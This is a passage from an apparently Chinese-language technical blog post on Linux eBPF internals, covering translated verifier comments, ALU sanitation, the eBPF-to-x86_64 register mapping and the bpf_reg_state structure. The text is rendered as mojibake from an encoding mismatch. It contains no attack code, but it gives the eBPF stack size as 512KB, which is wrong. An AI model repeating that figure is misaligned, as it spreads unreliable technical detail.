class="hljs-comment"> * PTR_TO_MAP_VALUE æ„ä¸ºè¯¥å¯„å­˜å™¨æŒ‡å‘ &#x27;map element value&#x27;</span><br><span class="hljs-comment"> * å¯è®¿é—®çš„èŒƒå›´ä¸º [ptr, ptr + map&#x27;s value_size).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç”¨ä»¥åœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼ å€¼çš„å¯„å­˜å™¨è¢«æ ¹æ®å‡½æ•°å‚æ•°çº¦æŸè¿›è¡Œæ£€æŸ¥</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ARG_PTR_TO_MAP_KEY ä¾¿æ˜¯å…¶ä¸­ä¸€ä¸ªè¿™æ ·çš„å‚æ•°çº¦æŸ.</span><br><span class="hljs-comment"> * å…¶æ„ä¸ºä¼ é€’ç»™è¯¥å‡½æ•°çš„å¯„å­˜å™¨ç±»å‹å¿…é¡»ä¸º PTR_TO_STACK</span><br><span class="hljs-comment"> * ä¸”å…¶åœ¨å‡½æ•°å†…å°†è¢«ä½œä¸º &#x27;pointer to map element key&#x27; ä½¿ç”¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¾‹å¦‚ï¼Œè¿™äº›æ˜¯ bpf_map_lookup_elem() çš„å‚æ•°çº¦å®š:</span><br><span class="hljs-comment"> *   .ret_type = RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="hljs-comment"> *   .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="hljs-comment"> *   .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ret_type è¡¨ç¤ºè¯¥å‡½æ•°è¿”å› &#x27;pointer to map elem value or null&#x27;</span><br><span class="hljs-comment"> * å‡½æ•°å¸Œæœ›ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªæŒ‡å‘ &#x27;struct bpf_map&#x27; çš„å¸¸é‡æŒ‡é’ˆï¼Œ</span><br><span class="hljs-comment"> * ç¬¬äºŒä¸ªå‚æ•°åˆ™åº”ä¸ºæŒ‡å‘æ ˆçš„æŒ‡é’ˆï¼Œå…¶ä¼šåœ¨ helper å‡½æ•°å†…ç”¨ä½œ</span><br><span class="hljs-comment"> * æŒ‡å‘[map element key]çš„æŒ‡é’ˆ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å†…æ ¸ä¾§çš„ helper å‡½æ•°æœ‰å¦‚ä¸‹å½¢å¼:</span><br><span class="hljs-comment"> * u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5)</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *    struct bpf_map *map = (struct bpf_map *) (unsigned long) r1;</span><br><span class="hljs-comment"> *    void *key = (void *) (unsigned long) r2;</span><br><span class="hljs-comment"> *    void *value;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    è¿™é‡Œå†…æ ¸å¯ä»¥å®‰å…¨åœ°è®¿é—® &#x27;key&#x27; ä¸ &#x27;map&#x27; æŒ‡é’ˆ, çŸ¥æ™“</span><br><span class="hljs-comment"> *    [key, key + map-&gt;key_size) å­—èŠ‚ä¸ºå¯ç”¨çš„ä¸”è¢«</span><br><span class="hljs-comment"> *    åˆå§‹åŒ–åœ¨ eBPF ç¨‹åºçš„æ ˆä¸Š.</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç›¸åº”çš„ eBPF ç¨‹åºæˆ–è®¸å½¢å¦‚:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // è¿™æ¡æŒ‡ä»¤å R2 çš„ç±»å‹ä¸º FRAME_PTR</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // è¿™æ¡æŒ‡ä»¤å R2 çš„ç±»å‹ä¸º PTR_TO_STACK</span><br><span class="hljs-comment"> *    BPF_LD_MAP_FD(BPF_REG_1, map_fd),      // è¿™æ¡æŒ‡ä»¤å R1 çš„ç±»å‹ä¸º CONST_PTR_TO_MAP</span><br><span class="hljs-comment"> *    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span><br><span class="hljs-comment"> * è¿™é‡Œ verifier å…³æ³¨ map_lookup_elem() çš„åŸå‹ï¼Œä¼šçœ‹åˆ°:</span><br><span class="hljs-comment"> * .arg1_type == ARG_CONST_MAP_PTR ä»¥åŠ R1-&gt;type == CONST_PTR_TO_MAP, è¿™æ˜¯ ğŸ†— çš„,</span><br><span class="hljs-comment"> * ç°åœ¨ verifier çŸ¥é“è¯¥ map æœ‰ä¸€ä¸ª R1-&gt;map_ptr-&gt;key_size å­—èŠ‚çš„ key</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç„¶åï¼Œ .arg2_type == ARG_PTR_TO_MAP_KEY and R2-&gt;type == PTR_TO_STACK, åˆ°ç°åœ¨è¿˜ğŸ†—,</span><br><span class="hljs-comment"> * ç°åœ¨ verifier æ£€æŸ¥ [R2, R2 + map&#x27;s key_size) åœ¨æ ˆçš„é™åˆ¶å†…ï¼Œ</span><br><span class="hljs-comment"> * ä¸”åœ¨è¯¥è°ƒç”¨ä¹‹å‰è¢«åˆå§‹åŒ–.</span><br><span class="hljs-comment"> * è‹¥ğŸ†—, verifier æ¥ä¸‹æ¥å…è®¸è¯¥ BPF_CALL æŒ‡ä»¤å¹¶å…³æ³¨</span><br><span class="hljs-comment"> * .ret_type ï¼ˆä¸º RET_PTR_TO_MAP_VALUE_OR_NULLï¼‰, æ•…è®©</span><br><span class="hljs-comment"> * R0-&gt;type = PTR_TO_MAP_VALUE_OR_NULL ï¼Œè¿™æ„å‘³ç€ bpf_map_lookup_elem() å‡½æ•°</span><br><span class="hljs-comment"> * è¿”å›æŒ‡å‘ map value çš„æŒ‡é’ˆæˆ– NULL.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“ç±»å‹ PTR_TO_MAP_VALUE_OR_NULL é€šè¿‡ &#x27;if (reg != 0) goto +off&#x27; æŒ‡ä»¤ï¼Œ</span><br><span class="hljs-comment"> * åœ¨ true åˆ†æ”¯ä¸­æŒæœ‰æŒ‡é’ˆçš„å¯„å­˜å™¨å°†çŠ¶æ€æ”¹å˜ä¸º PTR_TO_MAP_VALUEï¼Œ</span><br><span class="hljs-comment"> * åœ¨ false åˆ†æ”¯ä¸­åŒæ ·çš„å¯„å­˜å™¨å°†çŠ¶æ€æ”¹å˜ä¸º CONST_IMM ã€‚</span><br><span class="hljs-comment"> * å‚è§ check_cond_jmp_op().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨è°ƒç”¨å R0 è¢«è®¾ä¸ºå‡½æ•°è¿”å›å€¼ï¼Œå¯„å­˜å™¨ R1-R5 è¢«è®¾ä¸º NOT_INIT</span><br><span class="hljs-comment"> * ä»¥è¡¨ç¤ºå…¶ä¸å†å¯è¯».</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä»¥ä¸‹å¼•ç”¨ç±»å‹è¡¨ç¤ºä¸€ä¸ªå¯¹å†…æ ¸èµ„æºçš„æ½œåœ¨å¼•ç”¨ï¼Œ</span><br><span class="hljs-comment"> * åœ¨å…¶ç¬¬ä¸€æ¬¡è¢«åˆ†é…åï¼Œ BPF ç¨‹åºå¿…é¡»æ£€æŸ¥å¹¶é‡Šæ”¾è¯¥èµ„æº:</span><br><span class="hljs-comment"> * - PTR_TO_SOCKET_OR_NULL, PTR_TO_SOCKET</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“ verifier é‡åˆ°ä¸€ä¸ª helper è°ƒç”¨è¿”å›ä¸€ä¸ªå¼•ç”¨ç±»å‹, </span><br><span class="hljs-comment"> * å…¶ä¸ºè¯¥å¼•ç”¨åˆ†é…ä¸€ä¸ªæŒ‡é’ˆ id å¹¶å°†ä»–å‚¨å­˜åœ¨å½“å‰çš„å‡½æ•°çŠ¶æ€ä¸­.</span><br><span class="hljs-comment"> * ç±»ä¼¼äºå°† PTR_TO_MAP_VALUE_OR_NULL è½¬åŒ–ä¸º PTR_TO_MAP_VALUE çš„æ–¹å¼ï¼Œ</span><br><span class="hljs-comment"> * å½“ç±»å‹é€šè¿‡ä¸€ä¸ª NULL-check æ¡ä»¶ï¼Œ PTR_TO_SOCKET_OR_NULL å˜ä¸º PTR_TO_SOCKETã€‚</span><br><span class="hljs-comment"> * å¯¹äºçŠ¶æ€å˜ä¸º CONST_IMM çš„åˆ†æ”¯ï¼Œverifierä¼šé‡Šæ”¾å¼•ç”¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¯¹æ¯ä¸ªä¼šåˆ†é…ä¸€ä¸ªå¼•ç”¨çš„ helper å‡½æ•°ï¼Œä¾‹å¦‚ bpf_sk_lookup_tcp()ï¼Œ</span><br><span class="hljs-comment"> * éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„é‡Šæ”¾å‡½æ•°ï¼Œä¾‹å¦‚bpf_sk_release()ã€‚</span><br><span class="hljs-comment"> * å½“ä¸€ä¸ªå¼•ç”¨ç±»å‹ä¼ å…¥é‡Šæ”¾å‡½æ•°æ—¶ï¼Œverifier åŒæ ·é‡Šæ”¾å¼•ç”¨ã€‚</span><br><span class="hljs-comment"> * è‹¥åœ¨ç¨‹åºæœ«å°¾ä»ä¿ç•™æœ‰ä»»ä½•æœªæ£€æŸ¥æˆ–æœªé‡Šæ”¾çš„å¼•ç”¨ï¼Œverifier ä¼šæ‹’ç»ä»–</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="ALU-Sanitation"><a href="#ALU-Sanitation" class="headerlink" title="ALU Sanitation"></a>ALU Sanitation</h3><p><code>ALU Sanitation</code> æ˜¯ eBPF ä¸­ä¸€ä¸ª<strong>ä»£ç åŠ å›ºä¸è¿è¡Œæ—¶åŠ¨æ€æ£€æµ‹</strong>çš„æ¡†æ¶ï¼Œé€šè¿‡å¯¹ç¨‹åºæ­£åœ¨å¤„ç†çš„å®é™…å€¼è¿›è¡Œè¿è¡Œæ—¶æ£€æŸ¥ä»¥å¼¥è¡¥ verifier é™æ€åˆ†æçš„ä¸è¶³ï¼Œè¿™é¡¹æŠ€æœ¯é€šè¿‡è°ƒç”¨ <code>fixup_bpf_calls()</code> <strong>ä¸º eBPF ç¨‹åºä¸­çš„æ¯ä¸€æ¡æŒ‡ä»¤çš„å‰é¢éƒ½æ·»åŠ ä¸Šé¢å¤–çš„è¾…åŠ©æŒ‡ä»¤ã€æ›¿æ¢éƒ¨åˆ†æŒ‡ä»¤</strong>ç­‰æ–¹å¼æ¥å®ç°</p><h2 id="ä¸‰ã€eBPF-è™šæ‹Ÿæœº"><a href="#ä¸‰ã€eBPF-è™šæ‹Ÿæœº" class="headerlink" title="ä¸‰ã€eBPF è™šæ‹Ÿæœº"></a>ä¸‰ã€eBPF è™šæ‹Ÿæœº</h2><p>eBPF è™šæ‹Ÿæœºæœ¬è´¨ä¸Šæ˜¯ RISC æ¶æ„ï¼Œä¸€å…±æœ‰ 11 ä¸ª 64 ä½å¯„å­˜å™¨ï¼Œä¸€ä¸ªç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ä¸ä¸€ä¸ªå›ºå®šå¤§å°çš„å †æ ˆï¼ˆé€šå¸¸ä¸º 512KBï¼‰ï¼Œåœ¨ x86 æ¶æ„ä¸‹çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">eBPF å¯„å­˜å™¨</th><th align="center">æ˜ å°„ x86_64 å¯„å­˜å™¨</th><th align="center">ç”¨é€”</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">rax</td><td align="center">å‡½æ•°è¿”å›å€¼</td></tr><tr><td align="center">R1</td><td align="center">rdi</td><td align="center">argv1</td></tr><tr><td align="center">R2</td><td align="center">rsi</td><td align="center">argv2</td></tr><tr><td align="center">R3</td><td align="center">rdx</td><td align="center">argv3</td></tr><tr><td align="center">R4</td><td align="center">rcx</td><td align="center">argv4</td></tr><tr><td align="center">R5</td><td align="center">r8</td><td align="center">argv5</td></tr><tr><td align="center">R6</td><td align="center">rbx</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R7</td><td align="center">r13</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R8</td><td align="center">r14</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R9</td><td align="center">r15</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R10ï¼ˆåªè¯»ï¼‰</td><td align="center">rbp</td><td align="center">å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨</td></tr></tbody></table><p>r1 ~ r5 è¿™äº”ä¸ªå¯„å­˜å™¨ç”¨ä½œ eBPF ä¸­çš„å‡½æ•°è°ƒç”¨ä¼ å‚ï¼Œä¸”åªèƒ½ä¿å­˜å¸¸æ•°æˆ–æ˜¯æŒ‡å‘å †æ ˆçš„æŒ‡é’ˆï¼Œå› æ­¤æ‰€æœ‰çš„å†…å­˜è®¿é—®éƒ½éœ€è¦å…ˆæŠŠæ•°æ®åŠ è½½åˆ° eBPF å †æ ˆä¸­æ‰èƒ½ä½¿ç”¨ï¼Œè¿™ç§é™åˆ¶ç®€åŒ–äº† eBPF çš„å†…å­˜æ¨¡å‹ï¼Œä¹Ÿæ›´æ–¹ä¾¿ verifier è¿›è¡Œæ£€æŸ¥</p><p><img src="https://s2.loli.net/2023/05/28/68e53xiKbH4TQz7.png" alt="eBPF.png"></p><h3 id="bpf-reg-state-eBPF-å¯„å­˜å™¨çŠ¶æ€"><a href="#bpf-reg-state-eBPF-å¯„å­˜å™¨çŠ¶æ€" class="headerlink" title="bpf_reg_state - eBPF å¯„å­˜å™¨çŠ¶æ€"></a>bpf_reg_state - eBPF å¯„å­˜å™¨çŠ¶æ€</h3><p>åœ¨ eBPF ä¸­ï¼Œä¸€ä¸ªå¯„å­˜å™¨çš„çŠ¶æ€ä¿¡æ¯ä½¿ç”¨ <code>bpf_reg_state</code> è¿›è¡Œè¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> &#123;</span><br><span class="hljs-comment">/* å„å­—æ®µçš„é¡ºåºæ˜¯é‡è¦çš„.  å‚è§ states_equal() */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* æŒ‡é’ˆåç§»çš„å›ºå®šéƒ¨åˆ†, ä»…æŒ‡é’ˆç±»å‹ */</span><br>s32 off;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* å½“ type == PTR_TO_PACKET æ—¶å¯ç”¨ */</span><br><span class="hljs-type">int</span> range;<br><br><span class="hljs-comment">/* å½“ type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="hljs-comment"> *   PTR_TO_MAP_VALUE_OR_NULL æ—¶å¯ç”¨</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map_ptr</span>;</span><br><span class="hljs-comment">/* ä¸ºäº†ä»å¤–éƒ¨æ˜ å°„ä¸­åŒºåˆ†æ˜ å°„æŸ¥æ‰¾</span><br><span class="hljs-comment"> * map_uid å¯¹äºæŒ‡å‘å†…éƒ¨æ˜ å°„çš„å¯„å­˜å™¨ä¸ºé 0 å€¼</span><br><span class="hljs-comment"> */</span><br>u32 map_uid;<br>&#125;;<br><br><span class="hljs-comment">/* for PTR_TO_BTF_ID */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br>u32 btf_id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span><br>u32 mem_size;<br>u32 dynptr_id; <span class="hljs-comment">/* for dynptr slices */</span><br>&#125;;<br><br><span class="hljs-comment">/* For dynptr stack slots */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_dynptr_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* ä¸€ä¸ª dynptr ä¸º 16 å­—èŠ‚ï¼Œ æ•…å…¶å ç”¨ 2 ä¸ª stack slots.</span><br><span class="hljs-comment"> * æˆ‘ä»¬éœ€è¦è¿½è¸ªå“ªä¸€ä¸ª slot ä¸ºç¬¬ä¸€ä¸ªé˜²æ­¢ç”¨æˆ·å¯èƒ½å°è¯•ä¼ å…¥ä¸€ä¸ªä»</span><br><span class="hljs-comment"> * dynptr çš„ç¬¬äºŒä¸ª slot å¼€å§‹çš„åœ°å€çš„æƒ…å†µçš„ slot.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> first_slot;<br>&#125; dynptr;<br><br><span class="hljs-comment">/* ä»¥ä¸Šä»»æ„ä¸€ä¸ªçš„æœ€å¤§å°ºå¯¸. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw1;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw2;<br>&#125; raw;<br><br>u32 subprogno; <span class="hljs-comment">/* for PTR_TO_FUNC */</span><br>&#125;;<br><span class="hljs-comment">/* å¯¹äºæ ‡é‡ç±»å‹ (SCALAR_VALUE), å…¶è¡¨ç¤ºæˆ‘ä»¬å¯¹å®é™…å€¼çš„äº†è§£.</span><br><span class="hljs-comment"> * å¯¹äºæŒ‡é’ˆç±»å‹, å…¶è¡¨ç¤ºä»è¢«æŒ‡å‘å¯¹è±¡çš„åç§»çš„å¯å˜éƒ¨åˆ†ï¼Œ</span><br><span class="hljs-comment"> * ä¸”åŒä¸æˆ‘ä»¬æœ‰ç›¸åŒ id çš„æ‰€æœ‰ bpf_reg_states å…±äº«.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var_off</span>;</span><br><span class="hljs-comment">/* è¢«ç”¨äºç¡®å®šä»»ä½•ä½¿ç”¨è¯¥å¯„å­˜å™¨çš„å†…å­˜è®¿é—®æ˜¯å¦å°†å¯¼è‡´ä¸€ä¸ªåçš„è®¿é—®.</span><br><span class="hljs-comment"> * These refer to the same value as var_off, not necessarily the actual</span><br><span class="hljs-comment"> * contents of the register.</span><br><span class="hljs-comment"> */</span><br>s64 smin_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (s64) */</span><br>s64 smax_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (s64) */</span><br>u64 umin_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (u64) */</span><br>u64 umax_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (u64) */</span><br>s32 s32_min_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (s32) */</span><br>s32 s32_max_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (s32) */</span><br>u32 u32_min_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (u32) */</span><br>u32 u32_max_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (u32) */</span><br><span class="hljs-comment">/* å¯¹äº PTR_TO_PACKET, ç”¨ä»¥æ‰¾åˆ°æœ‰ç€ç›¸åŒå˜é‡åç§»çš„å…¶ä»–æŒ‡é’ˆï¼Œ</span><br><span class="hljs-comment"> * ç”±æ­¤ä»–ä»¬å¯ä»¥å…±äº«èŒƒå›´ä¿¡æ¯.</span><br><span class="hljs-comment"> * å¯¹äº PTR_TO_MAP_VALUE_OR_NULL å…¶è¢«ç”¨äºå…±äº«æˆ‘ä»¬æ¥è‡ªå“ªä¸€ä¸ªæ˜ å°„å€¼</span><br><span class="hljs-comment"> * å½“å…¶ä¸€è¢«æµ‹è¯•äº != NULL.</span><br><span class="hljs-comment"> * å¯¹äº PTR_TO_MEM_OR_NULL å…¶è¢«ç”¨äºè¾¨è¯†å†…å­˜åˆ†é…ä»¥è¿½è¸ªå…¶é‡Šæ”¾.</span><br><span class="hljs-comment"> * å¯¹äº PTR_TO_SOCKET å…¶è¢«ç”¨äºå…±äº«å“ªä¸€ä¸ªæŒ‡é’ˆä¿ç•™äº†å¯¹ socket çš„ç›¸åŒå¼•ç”¨ï¼Œ</span><br><span class="hljs-comment"> * ä»¥ç¡®å®šåˆé€‚çš„å¼•ç”¨é‡Šæ”¾.</span><br><span class="hljs-comment"> * å¯¹äºä½œä¸º dynptrs çš„ stack slots, å…¶è¢«ç”¨äºè¿½è¸ªå¯¹ dynptrçš„å¼•ç”¨</span><br><span class="hljs-comment"> * ä»¥ç¡®å®šåˆé€‚çš„å¼•ç”¨é‡Šæ”¾.</span><br><span class="hljs-comment"> */</span><br>u32 id;<br><span class="hljs-comment">/* PTR_TO_SOCKET ä¸ PTR_TO_TCP_SOCK å¯ä»¥ä¸ºä¸€ä¸ªè¿”å›è‡ªä¸€ä¸ª pointer-cast helper</span><br><span class="hljs-comment"> * bpf_sk_fullsock() ä¸ bpf_tcp_sock() çš„æŒ‡é’ˆ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è€ƒè™‘å¦‚ä¸‹æƒ…å†µï¼Œ &quot;sk&quot; ä¸ºä¸€ä¸ªè¿”å›è‡ª &quot;sk = bpf_sk_lookup_tcp();&quot; çš„å¼•ç”¨è®¡æ•°æŒ‡é’ˆ:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1: sk = bpf_sk_lookup_tcp();</span><br><span class="hljs-comment"> * 2: if (!sk) &#123; return 0; &#125;</span><br><span class="hljs-comment"> * 3: fullsock = bpf_sk_fullsock(sk);</span><br><span class="hljs-comment"> * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 5: tp = bpf_tcp_sock(fullsock);</span><br><span class="hljs-comment"> * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 7: bpf_sk_release(sk);</span><br><span class="hljs-comment"> * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier å°†æŠ—è®®</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ç¬¬ 7 è¡Œçš„ bpf_sk_release(sk) ä¹‹å, &quot;fullsock&quot; æŒ‡é’ˆä¸</span><br><span class="hljs-comment"> * &quot;tp&quot; æŒ‡é’ˆéƒ½åº”å½“è¢«æ— æ•ˆåŒ–.  ä¸ºäº†è¿™ä¹ˆåš, ä¿å­˜ &quot;fullsock&quot; ä¸ &quot;sk&quot;</span><br><span class="hljs-comment"> * çš„å¯„å­˜å™¨éœ€è¦è®°ä½åœ¨ ref_obj_id ä¸­çš„åŸå§‹å¼•ç”¨è®¡æ•°æŒ‡é’ˆ id(å³ï¼Œ sk_reg-&gt;id)</span><br><span class="hljs-comment"> * è¿™æ · verifier ä¾¿èƒ½é‡ç½®æ‰€æœ‰ ref_obj_id åŒ¹é… sk_reg-&gt;id çš„å¯„å­˜å™¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * sk_reg-&gt;ref_obj_id åœ¨ç¬¬ 1 è¡Œè¢«è®¾ä¸º sk_reg-&gt;id.</span><br><span class="hljs-comment"> * sk_reg-&gt;id å°†ä»…ä½œä¸º NULL-marking çš„ç›®çš„ä¿æŒ.</span><br><span class="hljs-comment"> * åœ¨ NULL-marking å®Œæˆå, sk_reg-&gt;id å¯ä»¥è¢«é‡ç½®ä¸º 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ç¬¬ 3 è¡Œçš„ &quot;fullsock = bpf_sk_fullsock(sk);&quot; ä¹‹å,</span><br><span class="hljs-comment"> * fullsock_reg-&gt;ref_obj_id è¢«è®¾ä¸º sk_reg-&gt;ref_obj_id.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ç¬¬ 5 è¡Œçš„ &quot;tp = bpf_tcp_sock(fullsock);&quot; ä¹‹å,</span><br><span class="hljs-comment"> * tp_reg-&gt;ref_obj_id è¢«è®¾ä¸º fullsock_reg-&gt;ref_obj_id</span><br><span class="hljs-comment"> * ä¸ sk_reg-&gt;ref_obj_id ä¸€è‡´.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä» verifier çš„è§’åº¦è€Œè¨€, è‹¥ sk, fullsock ä¸ tp éƒ½é NULL,</span><br><span class="hljs-comment"> * ä»–ä»¬ä¸ºæœ‰ç€ä¸åŒ reg-&gt;type çš„ç›¸åŒæŒ‡é’ˆ.</span><br><span class="hljs-comment"> * ç‰¹åˆ«åœ°, bpf_sk_release(tp) ä¹Ÿè¢«å…è®¸ä¸”æœ‰ç€ä¸ bpf_sk_release(sk) </span><br><span class="hljs-comment"> * ç›¸åŒçš„å½±å“.</span><br><span class="hljs-comment"> */</span><br>u32 ref_obj_id;<br><span class="hljs-comment">/* ç”¨äºå­˜æ´»æ£€æŸ¥çš„äº²å­é“¾ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">parent</span>;</span><br><span class="hljs-comment">/* åœ¨è¢«è°ƒç”¨æ–¹ä¸­ä¸¤ä¸ªå¯„å­˜å™¨å¯ä»¥åŒæ—¶ä¸º PTR_TO_STACK å¦‚åŒ R1=fp-8 ä¸ R2=fp-8,</span><br><span class="hljs-comment"> * ä½†å…¶ä¸€æŒ‡å‘è¯¥å‡½æ•°æ ˆè€Œå¦ä¸€æŒ‡å‘è°ƒç”¨æ–¹çš„æ ˆ. ä¸ºäº†åŒºåˆ†ä»–ä»¬ &#x27;frameno&#x27; è¢«ä½¿ç”¨ï¼Œ</span><br><span class="hljs-comment"> * å…¶ä¸ºä¸€ä¸ªæŒ‡å‘ bpf_func_state çš„ bpf_verifier_state-&gt;frame[] æ•°ç»„ä¸­çš„ä¸‹æ ‡.</span><br><span class="hljs-comment"> */</span><br>u32 frameno;<br><span class="hljs-comment">/* 